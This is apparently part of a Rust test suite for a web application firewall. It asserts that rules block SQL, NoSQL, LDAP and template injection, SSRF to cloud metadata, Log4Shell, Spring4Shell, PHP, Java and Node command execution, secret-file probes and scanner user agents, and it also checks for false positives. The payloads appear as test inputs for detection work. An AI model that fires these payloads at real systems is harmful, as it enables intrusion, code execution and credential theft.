		// SQLi (5) in the query + XSS tuned up to 6 in a header = 11; the scored block's
		// aggregate reflects the override, and the dominant (now-heavier XSS) rule is named.
		let waf = Waf::starter().scoring_threshold(8).set_category_weight(WafCategory::Xss, 6);
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		let m = blocked(&v);
		assert_eq!(m.score, Some(11));
		assert_eq!(m.category, WafCategory::Xss);
	}

	#[test]
	fn category_weight_scale_is_ordered() {
		// Critical injection classes weigh at least as much as protocol oddities.
		assert!(WafCategory::Sqli.weight() >= WafCategory::Xss.weight());
		assert!(WafCategory::Xss.weight() >= WafCategory::ProtocolAnomaly.weight());
		assert_eq!(WafCategory::Ssrf.weight(), WafCategory::Sqli.weight());
	}

	#[test]
	fn ssrf_cloud_metadata_is_blocked() {
		let waf = Waf::starter();
		// The AWS/GCP/Azure link-local metadata endpoint, by IP and by path.
		assert_eq!(waf.inspect_str("url=http://169.254.169.254/latest/meta-data/iam", "target").unwrap().category, WafCategory::Ssrf);
		assert_eq!(waf.inspect_str("target=/computeMetadata/v1/project", "target").unwrap().rule_id, "ssrf_cloud_metadata_path");
	}

	#[test]
	fn ssrf_internal_scheme_and_loopback_are_blocked() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("u=gopher://internal:6379/_INFO", "query").unwrap().rule_id, "ssrf_internal_scheme");
		assert_eq!(waf.inspect_str("next=file:///etc/hostname", "query").unwrap().category, WafCategory::Ssrf);
		assert_eq!(waf.inspect_str("fetch=http://127.0.0.1:8080/admin", "query").unwrap().rule_id, "ssrf_loopback_url");
		assert_eq!(waf.inspect_str("fetch=https://localhost/internal", "query").unwrap().rule_id, "ssrf_loopback_url");
	}

	#[test]
	fn ssrf_obfuscated_loopback_is_blocked() {
		// The obfuscated 127.0.0.1 encodings a naive literal rule misses all attribute to SSRF.
		let waf = Waf::starter();
		for u in [
			"url=http://0x7f000001/latest",          // packed hex
			"url=http://0x7f.0.0.1/x",                // dotted hex
			"url=http://0177.0.0.1/admin",            // dotted octal
			"url=http://017700000001/",               // packed octal
			"url=http://[::ffff:127.0.0.1]/meta",     // IPv4-mapped IPv6
		] {
			assert_eq!(waf.inspect_str(u, "query").unwrap().rule_id, "ssrf_obfuscated_loopback", "{u} should trip obfuscated-loopback SSRF");
		}
		// GCP metadata by DNS name. Use the bare host (no `/computeMetadata` path, which would
		// trip the lower-indexed `ssrf_cloud_metadata_path` first) so the hostname rule is what
		// fires; either way the block is attributed to SSRF.
		assert_eq!(waf.inspect_str("url=http://metadata.google.internal/", "query").unwrap().rule_id, "ssrf_metadata_hostname");
	}

	#[test]
	fn ssrf_obfuscated_loopback_keeps_false_positives_low() {
		// Benign URLs and hex/number-bearing paths that are not obfuscated loopbacks must pass.
		let waf = Waf::starter();
		for uri in [
			"/redirect?to=https://example.com/0x-hex-guide", // "0x" not after "://"
			"/blog/ipv6-addressing",                          // topic mention
			"/docs/google-cloud-metadata-api",                // hyphenated words, not the hostname
			"/colors?hex=0x7fddaa",                           // a hex color param, no "://"
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn ssrf_category_metadata_is_stable() {
		assert_eq!(WafCategory::Ssrf.name(), "ssrf");
		assert_eq!(WafCategory::ALL[WafCategory::Ssrf.index()], WafCategory::Ssrf);
		// The index is still a bijection over the (now seven) categories.
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn code_injection_rules_match() {
		let waf = Waf::starter();
		// Log4Shell and its nested-lookup obfuscation, a PHP unserialize gadget, and the
		// classic ${7*7} SSTI probe all attribute to the CodeInjection class.
		assert_eq!(waf.inspect_str("x=${jndi:ldap://evil/a}", "query").map(|m| m.category), Some(WafCategory::CodeInjection));
		assert_eq!(waf.inspect_str("x=${${lower:j}ndi:rmi://evil}", "query").unwrap().rule_id, "code_log4j_nested_lookup");
		assert_eq!(waf.inspect_str(r#"data=O:8:"Exploit":1:{s:3:"cmd"}"#, "query").unwrap().rule_id, "code_php_object_inject");
		assert_eq!(waf.inspect_str("tpl=${7*7}", "query").unwrap().rule_id, "code_ssti_arithmetic");
	}

	#[test]
	fn ssti_engine_probes_match() {
		// The extended SSTI arithmetic probes each fingerprint their engine and attribute to
		// CodeInjection: ERB/EJS, Ruby/Pug, Razor, Thymeleaf.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("v=<%= 7*7 %>", "query").unwrap().rule_id, "code_ssti_erb");
		assert_eq!(waf.inspect_str("v=#{7*7}", "query").unwrap().rule_id, "code_ssti_hash_delim");
		assert_eq!(waf.inspect_str("v=@(7*7)", "query").unwrap().rule_id, "code_ssti_razor");
		assert_eq!(waf.inspect_str("v=*{7*7}", "query").unwrap().rule_id, "code_ssti_thymeleaf");
	}

	#[test]
	fn ssti_engine_probes_keep_false_positives_low() {
		// Engine delimiters without a `digit*digit` arithmetic probe stay clean: a CSS/Sass
		// interpolation, an @-handle, a plain hash-braced variable.
		let waf = Waf::starter();
		for uri in ["/style?tpl=color:%23{$brand}", "/u/@(alice)", "/i18n?msg=%23{greeting}"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn code_injection_rules_keep_false_positives_low() {
		// Benign requests mentioning braces/dollars or the word "code" must still pass.
		let waf = Waf::starter();
		for uri in ["/articles/json-${schema}-guide", "/pricing?total=7", "/docs/php-serialization-explained", "/blog/clean-code-tips"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn php_code_injection_rules_match() {
		// OWASP-CRS 933xxx PHP port: open tag, superglobal, and a PHP-specific dangerous call.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("t=<?php system($_GET[c]);?>", "query").unwrap().category, WafCategory::CodeInjection);
		assert_eq!(waf.inspect_str("v=<?= 1 + 1 ?>", "query").unwrap().rule_id, "code_php_open_tag");
		assert_eq!(waf.inspect_str("x=$_REQUEST[cmd]", "query").unwrap().rule_id, "code_php_superglobal");
		assert_eq!(waf.inspect_str("q=phpinfo()", "query").unwrap().rule_id, "code_php_dangerous_call");
		assert_eq!(waf.inspect_str("d=shell_exec ('ls')", "query").unwrap().rule_id, "code_php_dangerous_call");
	}

	#[test]
	fn java_and_node_code_execution_rules_match() {
		// OWASP-CRS 944/node port: the JVM process-spawn gadgets and the Node child_process sink.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("p=Runtime.getRuntime().exec('id')", "query").unwrap().rule_id, "code_java_runtime_exec");
		assert_eq!(waf.inspect_str("p=new ProcessBuilder('sh','-c','id')", "query").unwrap().rule_id, "code_java_runtime_exec");
		assert_eq!(waf.inspect_str("m=require('child_process').exec('id')", "query").unwrap().rule_id, "code_node_child_process");
		assert_eq!(waf.inspect_str("m=child_process.spawnSync('id')", "query").unwrap().rule_id, "code_node_child_process");
	}

	#[test]
	fn prototype_pollution_rule_matches() {
		// OWASP-CRS 934130: the `__proto__` sentinel plus the dotted and bracket-chain
		// `constructor.prototype` access forms, however whitespace-padded.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("__proto__[polluted]=1", "query").unwrap().rule_id, "code_prototype_pollution");
		// The JSON pollution vector rides the `__proto__` limb (CRS keys the nested-key form off it).
		assert_eq!(waf.inspect_str(r#"{"__proto__": {"polluted": true}}"#, "body").unwrap().rule_id, "code_prototype_pollution");
		assert_eq!(waf.inspect_str("a=constructor.prototype.toString", "query").unwrap().rule_id, "code_prototype_pollution");
		assert_eq!(waf.inspect_str("a=constructor[prototype]", "query").unwrap().rule_id, "code_prototype_pollution");
		assert_eq!(waf.inspect_str("a=obj[constructor][prototype]", "query").unwrap().rule_id, "code_prototype_pollution");
		assert_eq!(waf.inspect_str("a=constructor . prototype", "query").unwrap().category, WafCategory::CodeInjection);
	}

	#[test]
	fn prototype_pollution_keeps_false_positives_low() {
		// A class named "constructor", a docs mention of prototypes, and a "prototype" query value
		// with no `constructor`/`__proto__` chain all stay clean — the rule needs the pairing.
		let waf = Waf::starter();
		for uri in [
			"/docs/constructor-functions",  // "constructor" as a word, no `.prototype` chain
			"/blog/prototype-design",       // "prototype" alone, no `constructor` head
			"/api/build-a-prototype",       // ditto
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn spring4shell_rule_matches() {
		// OWASP-CRS 944260 (CVE-2022-22965): the class-loader walk and the SpEL context gadget.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "body").unwrap().rule_id, "code_spring4shell");
		assert_eq!(waf.inspect_str("x=org.springframework.context.support.FileSystemXmlApplicationContext", "query").unwrap().rule_id, "code_spring4shell");
		assert_eq!(waf.inspect_str("class.module.classLoader.DefaultAssertionStatus=1", "body").unwrap().category, WafCategory::CodeInjection);
	}

	#[test]
	fn spring4shell_keeps_false_positives_low() {
		// A Java-flavored path that names a class loader as prose, and a Spring docs page, both stay
		// clean — the rule needs the exact `class.module.classloader` chain or the SpEL gadget FQN.
		let waf = Waf::starter();
		for uri in [
			"/docs/java-classloader-guide",   // "classloader" word, no `class.module.` chain
			"/blog/spring-framework-context",  // "spring" + "context" prose, no gadget FQN
			"/api/module-class-registry",      // reordered tokens, not the attack chain
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn java_serialized_variant_markers_match() {
		// The `rO0AB…` raw base64 opener was already covered; this asserts the CRS 944210 gzip/variant
		// openers (`KztAAU` / `Cs7QAF`) added to the same `code_java_serialized` rule also trip.
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("state=rO0ABXNyABBqYXZh", "body").unwrap().rule_id, "code_java_serialized");
		assert_eq!(waf.inspect_str("d=KztAAU9uZQ", "query").unwrap().rule_id, "code_java_serialized");
		assert_eq!(waf.inspect_str("blob=Cs7QAFsomegzippeddata", "body").unwrap().category, WafCategory::CodeInjection);
	}

	#[test]
	fn java_serialized_markers_keep_false_positives_low() {
		// Ordinary base64 that does not open with a serialization magic stays clean, and the markers
		// are case-sensitive so a lowercased look-alike in a path does not trip them.
		let waf = Waf::starter();
		assert!(waf.inspect_str("aGVsbG8gd29ybGQ=", "body").is_none(), "benign base64 should not false-positive");
		for uri in [
			"/files/ro0abstract-notes.txt",  // lowercase "ro0ab", not the case-sensitive marker
			"/img/logo-rO0.png",             // partial, no full `rO0AB` opener
			"/data/kztaau-lowercase.bin",    // lowercased variant opener stays clean
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn php_java_node_rules_keep_false_positives_low() {
		// Prose and identifiers that brush near the new tokens but are not the attack forms stay
		// clean: an XML processing instruction, a docs page mentioning the runtime, a variable
		// named like a superglobal without the `$_` prefix, and a benign "child processes" page.
		let waf = Waf::starter();
		// A real `<?xml` processing instruction must not trip the PHP open-tag rule.
		assert!(waf.inspect_str(r#"<?xml version="1.0"?>"#, "query").is_none(), "<?xml PI should not false-positive");
		for uri in [
			"/docs/java-runtime-environment",      // "runtime" as a word, no getRuntime() call
			"/settings?get_posts=10",              // `get_posts`, not a `$_` superglobal
			"/blog/understanding-child-processes", // "child process" prose, no require/call
			"/api/base64-encoding-guide",          // mentions base64 without the decode call
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn nosql_injection_rules_match() {
		let waf = Waf::starter();
		// MongoDB $where server-side JS, the JSON operator key, and the HTTP-parameter
		// operator form all attribute to the NoSqlInjection class.
		assert_eq!(waf.inspect_str(r#"{"$where": "this.a == this.b"}"#, "query").map(|m| m.category), Some(WafCategory::NoSqlInjection));
		assert_eq!(waf.inspect_str(r#"{"username":{"$ne":null}}"#, "query").unwrap().rule_id, "nosqli_json_operator");
		assert_eq!(waf.inspect_str("username[$ne]=&password[$ne]=", "query").unwrap().rule_id, "nosqli_param_operator");
		assert_eq!(waf.inspect_str("age[$gt]=0", "query").unwrap().category, WafCategory::NoSqlInjection);
	}

	#[test]
	fn orm_lookup_injection_rule_matches() {
		// Django/SQLAlchemy ORM double-underscore lookups (OWASP-CRS 4.28.0) used for blind
		// extraction all attribute to the NoSqlInjection class via the `nosqli_orm_lookup` rule.
		let waf = Waf::starter();
		for (q, why) in [
			("user__password__startswith=a", "blind prefix extraction"),
			("email__icontains=@evil", "case-insensitive substring probe"),
			("name__regex=^admin", "regex lookup"),
			("age__gte=18", "comparison lookup"),
			("token__isnull=false", "isnull lookup"),
			("slug__iendswith=.php", "case-insensitive suffix probe"),
		] {
			let m = waf.inspect_str(q, "query").unwrap_or_else(|| panic!("{q} ({why}) should trip the ORM lookup rule"));
			assert_eq!(m.rule_id, "nosqli_orm_lookup", "{q} ({why})");
			assert_eq!(m.category, WafCategory::NoSqlInjection);
		}
	}

	#[test]
	fn nosql_injection_rules_keep_false_positives_low() {
		// Benign requests mentioning prices, JSON, or array params must still pass. The ORM
		// lookup rule needs a `__lookup=` suffix, so ordinary double-underscore names
		// (`dunder__name`, a param that merely *contains* a lookup word without the `__` prefix)
		// stay clean.
		let waf = Waf::starter();
		for uri in [
			"/products?price[min]=10&price[max]=99",
			"/api/users?sort=name",
			"/blog/mongodb-vs-postgres",
			"/cart?items[0]=42",
			"/search?contains=widget",       // "contains" as a plain key, no `__` prefix
			"/py/__init__=1",                // dunder that is not an ORM lookup keyword
			"/opt?newsletter_optin=true",    // single-underscore opt-in, not `__in=`
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn nosql_category_metadata_is_stable() {
		assert_eq!(WafCategory::NoSqlInjection.name(), "nosql_injection");
		assert_eq!(WafCategory::NoSqlInjection.weight(), WafCategory::Sqli.weight());
		// The index is still a bijection over every category.
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn ldap_injection_rules_match() {
		let waf = Waf::starter();
		// Filter break-out, wildcard break, and an always-true boolean group all attribute
		// to the LdapInjection class.
		assert_eq!(waf.inspect_str("user=*)(uid=*))(|(uid=*", "query").map(|m| m.category), Some(WafCategory::LdapInjection));
		assert_eq!(waf.inspect_str("name=admin*)(cn=*)", "query").unwrap().rule_id, "ldapi_wildcard_break");
		assert_eq!(waf.inspect_str("filter=(|(uid=admin)(uid=root))", "query").unwrap().rule_id, "ldapi_bool_group");
	}

	#[test]
	fn ldap_injection_rules_keep_false_positives_low() {
		// Parenthesised titles, alternation, and benign filter-like text must still pass —
		// the rules require the paren-paren-operator order an LDAP break-out has, not the
		// operator-between-groups order legitimate text uses.
		let waf = Waf::starter();
		for uri in ["/wiki/Album_(2020)", "/search?q=(cats)|(dogs)", "/docs/ldap-tutorial", "/math?f=(a)(b)"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn ldap_category_metadata_is_stable() {
		assert_eq!(WafCategory::LdapInjection.name(), "ldap_injection");
		assert_eq!(WafCategory::LdapInjection.weight(), WafCategory::Sqli.weight());
		// The index is still a bijection over every category.
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn xxe_rules_match() {
		let waf = Waf::starter();
		// An external (SYSTEM) entity and a DOCTYPE carrying an inline DTD subset both
		// attribute to the Xxe class. XXE payloads usually arrive in a request body, scanned
		// with the same ruleset.
		// (A SYSTEM URL pointing at /etc/passwd or file:// would trip the earlier
		// traversal/SSRF rules first; use a neutral external DTD so the XXE rule is what fires.)
		assert_eq!(blocked(&waf.inspect_body(br#"<!ENTITY xxe SYSTEM "ext-entity.dtd">"#)).category, WafCategory::Xxe);
		// A DOCTYPE with an inline `[` subset but no entity reports the DTD-subset rule.
		assert_eq!(waf.inspect_str(r"<!DOCTYPE r [<!ELEMENT r (#PCDATA)>]>", "body").unwrap().rule_id, "xxe_doctype_dtd");
		// With the broad entity-declaration rule disabled, an external entity still trips the
		// more specific SYSTEM/PUBLIC rule.
		let specific = Waf::starter().disable_rule("xxe_entity_decl");
		assert_eq!(specific.inspect_str(r#"<!ENTITY x SYSTEM "ext-entity.dtd">"#, "body").unwrap().rule_id, "xxe_entity_external");
	}

	#[test]
	fn xxe_rules_keep_false_positives_low() {
		// Legitimate HTML/XHTML doctypes (which use PUBLIC/SYSTEM but declare no entity) and
		// benign XML-mentioning paths must still pass — the external rule is keyed on
		// `<!ENTITY`, and the DTD rule needs an inline `[` subset HTML never carries.
		let waf = Waf::starter().inspect_body_up_to(4096);
		assert_eq!(waf.inspect_body(b"<!DOCTYPE html>"), Verdict::Allow);
		assert_eq!(waf.inspect_body(br#"<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">"#), Verdict::Allow);
		for uri in ["/docs/xml-tutorial", "/articles/entity-relationship-diagrams", "/blog/dtd-vs-xsd"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn xxe_category_metadata_is_stable() {
		assert_eq!(WafCategory::Xxe.name(), "xxe");
		assert_eq!(WafCategory::Xxe.weight(), WafCategory::Sqli.weight());
		// The index is still a bijection over every category.
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn crs_restricted_file_access_matches() {
		// VCS trees, framework configs, secrets files, and backup/dump artifacts all attribute
		// to the PathTraversal class.
		let waf = Waf::starter();
		for (uri, rule) in [
			("/.git/config", "traversal_vcs_config_files"),
			("/.svn/entries", "traversal_vcs_config_files"),
			("/.env", "traversal_vcs_config_files"),
			("/.env.production", "traversal_vcs_config_files"),
			("/.htaccess", "traversal_vcs_config_files"),
			("/web.config", "traversal_vcs_config_files"),
			("/backups/db.sql", "traversal_backup_files"),
			("/wp-config.php.bak", "traversal_backup_files"),
			("/index.php.swp", "traversal_backup_files"),
			// AI coding-assistant artifact dotdirs (CRS rule 930140 / ai-critical-artifacts.data).
			("/.claude/settings.local.json", "traversal_ai_assistant_artifacts"),
			("/.cursor/mcp.json", "traversal_ai_assistant_artifacts"),
			("/.codex/config.toml", "traversal_ai_assistant_artifacts"),
			("/.windsurf/rules", "traversal_ai_assistant_artifacts"),
			("/.a0proj/secrets.env", "traversal_ai_assistant_artifacts"),
			("/.n8n/config", "traversal_ai_assistant_artifacts"),
			// Nested under a project subdir — the substring is still anchored by its enclosing slash.
			("/repo/.aider/aider.conf.yml", "traversal_ai_assistant_artifacts"),
			// The two CRS entries that ship without a trailing slash take a word-boundary tail.
			("/.qwen_code", "traversal_ai_assistant_artifacts"),
			("/.crush", "traversal_ai_assistant_artifacts"),
		] {
			let v = waf.inspect(&parts("GET", uri));
			let m = blocked(&v);
			assert_eq!(m.rule_id, rule, "{uri} should trip {rule}");
			assert_eq!(m.category, WafCategory::PathTraversal);
		}
	}

	#[test]
	fn crs_restricted_file_access_keeps_false_positives_low() {
		// Look-alikes without the dot segment / enclosing slash, and paths that merely mention
		// the tokens as words, must still pass.
		let waf = Waf::starter();
		for uri in [
			"/.environment-vars-guide",  // `.env` guarded by \b, "environment" != ".env\b"
			"/settings/gitignore-help",  // no `/.gitignore` dot segment
			"/blog/git-workflows",       // "git" as a word, not the `/.git/` tree
			"/products/webcconfig-tool", // "webconfig" != "/web.config"
			"/docs/backup-strategies",   // "backup" as a word, no `.bak` extension
			"/blog/nosql-basics",        // "sql" inside "nosql", no `.sql` extension
			// AI-artifact look-alikes: the tool names as path words, without the leading `/.` dot
			// segment (CRS 930140 matches the dotdir, not the bare word).
			"/blog/claude-code-tips",    // "claude" as a word, no `/.claude/`
			"/products/cursor-ide",      // "cursor" as a word, no `/.cursor/`
			"/docs/continue-reading",    // "continue" prose, no `/.continue/`
			"/.crushed-ice",             // `.crush` guarded by \b: "crushed" != ".crush\b"
			"/.qwen_coder-guide",        // `.qwen_code` guarded by \b, "coder" tail stays clean
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn scanner_detection_rules_match() {
		// A self-identifying attack tool trips the ScannerDetection class wherever its
		// `name/version` token lands — most naturally in the User-Agent header.
		let waf = Waf::starter();
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "sqlmap/1.7.2#stable (http://sqlmap.org)".parse().unwrap());
		let v = waf.inspect(&p);
		let m = blocked(&v);
		assert_eq!(m.rule_id, "scanner_security_tool");
		assert_eq!(m.category, WafCategory::ScannerDetection);
		assert_eq!(m.location, "header:user-agent");
		// The CRS 4.26.0 additions (ghauri, WhatWAF) and a classic (Nikto) all fire.
		for ua in ["Mozilla/5.00 (Nikto/2.1.6)", "ghauri/1.3", "WhatWAF/2.0", "nuclei/3.1.0"] {
			assert_eq!(waf.inspect_str(ua, "header:user-agent").unwrap().category, WafCategory::ScannerDetection, "{ua} should trip scanner detection");
		}
		// Nmap's NSE probe (no version slash) has its own rule.
		assert_eq!(waf.inspect_str("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)", "header:user-agent").unwrap().rule_id, "scanner_nmap_nse");
	}

	#[test]
	fn scanner_detection_keeps_false_positives_low() {
		// The trailing-slash guard keeps prose that merely *names* a tool clean: a docs path,
		// a blog comparison, and a search query (where `+` folds to a space) all pass because
		// none carry the `name/version` token a real tool UA does.
		let waf = Waf::starter();
		for uri in [
			"/docs/sqlmap-detection-guide",   // "sqlmap-", no version slash
			"/blog/nikto-vs-nuclei",          // tool names as words, no slash
			"/tools/nmap-cheatsheet",         // "nmap-", not the NSE phrase
			"/search?q=how+to+use+wpscan",    // folds to "how to use wpscan", no slash
			"/about/security-scanners",       // generic mention
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn scanner_category_metadata_is_stable() {
		assert_eq!(WafCategory::ScannerDetection.name(), "scanner_detection");
		assert_eq!(WafCategory::ScannerDetection.weight(), WafCategory::Sqli.weight());
		assert_eq!(WafCategory::ALL[WafCategory::ScannerDetection.index()], WafCategory::ScannerDetection);
		// The index is still a bijection over every category (now eleven).
		assert_eq!(WafCategory::ALL.len(), 11);
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn new_sqli_and_xss_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("1 UNION SELECT pw INTO OUTFILE '/tmp/x'", "target").map(|m| m.category), Some(WafCategory::Sqli));
		assert_eq!(waf.inspect_str("href=vbscript:msgbox(1)", "target").unwrap().rule_id, "xss_vbscript_uri");
	}

	#[test]
	fn ssrf_rules_keep_false_positives_low() {
		// Benign requests that mention URLs/paths but are not SSRF must still pass.
		let waf = Waf::starter();
		for uri in ["/redirect?to=https://example.com/welcome", "/blog/file-formats-explained", "/docs/localhost-development-guide", "/articles/the-year-1692"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn disable_rule_silences_one_signature() {
		// Disabling the script-tag rule lets that payload through while the rest still fire.
		let waf = Waf::starter().disable_rule("xss_script_tag");
		assert!(!waf.is_rule_enabled("xss_script_tag"));
		assert_eq!(waf.enabled_rule_count(), waf.rule_count() - 1);
		assert_eq!(waf.inspect_str("<script>alert(1)</script>", "target"), None);
		// A different XSS rule (iframe) is untouched.
		assert_eq!(waf.inspect_str("<iframe src=//evil", "target").unwrap().rule_id, "xss_iframe_tag");
	}

	#[test]
	fn disable_rule_falls_through_to_next_matching_rule() {
		// With the earlier-indexed rule off, a string matching two rules reports the other.
		let waf = Waf::starter().disable_rule("xss_js_uri");
		let m = waf.inspect_str("javascript:void(0) onerror=1", "target").unwrap();
		assert_eq!(m.rule_id, "xss_event_handler");
	}

	#[test]
	fn disable_category_silences_a_whole_class() {
		let waf = Waf::starter().disable_category(WafCategory::Sqli);
		assert_eq!(waf.inspect_str("1 UNION SELECT pw FROM users", "target"), None);
		assert_eq!(waf.inspect_str("id=1 AND SLEEP(5)", "target"), None);
		// A non-SQLi attack is unaffected.
		assert_eq!(waf.inspect_str("<script>x</script>", "target").unwrap().category, WafCategory::Xss);
		// Every SQLi rule is now disabled.
		for r in starter_rules().into_iter().filter(|r| r.category == WafCategory::Sqli) {
			assert!(!waf.is_rule_enabled(r.id));
		}
	}

	#[test]
	fn disable_unknown_rule_is_a_noop() {
		let waf = Waf::starter().disable_rule("does_not_exist");
		assert_eq!(waf.enabled_rule_count(), waf.rule_count());
		assert!(!waf.is_rule_enabled("does_not_exist"));
	}

	#[test]
	fn disable_category_leaves_multi_encoding_guard_independent() {
		// Disabling ProtocolAnomaly rules must not turn off the multiple-encoding guard,
		// which is governed solely by block_multi_encoded.
		let waf = Waf::starter().disable_category(WafCategory::ProtocolAnomaly);
		let m = waf.inspect_str("a%252e%252e%252fb", "target").unwrap();
		assert_eq!(m.rule_id, MULTI_ENCODING_RULE_ID);
	}
}
